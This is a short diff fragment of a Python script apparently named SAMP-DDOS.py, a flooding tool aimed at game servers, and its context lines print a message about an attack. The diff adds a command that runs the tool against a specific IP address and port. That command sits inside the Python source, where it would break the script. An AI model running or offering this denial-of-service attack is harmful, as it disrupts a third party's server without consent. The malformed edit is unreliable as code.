@@ -71,3 +71,5 @@ if __name__ == '__main__':
          print('\n\n')
          print('Attack berhasil ip {} foi parado'.format(orgip))
          pass
+
+python3 SAMP-DDOS.py 65.108.101.89:32137
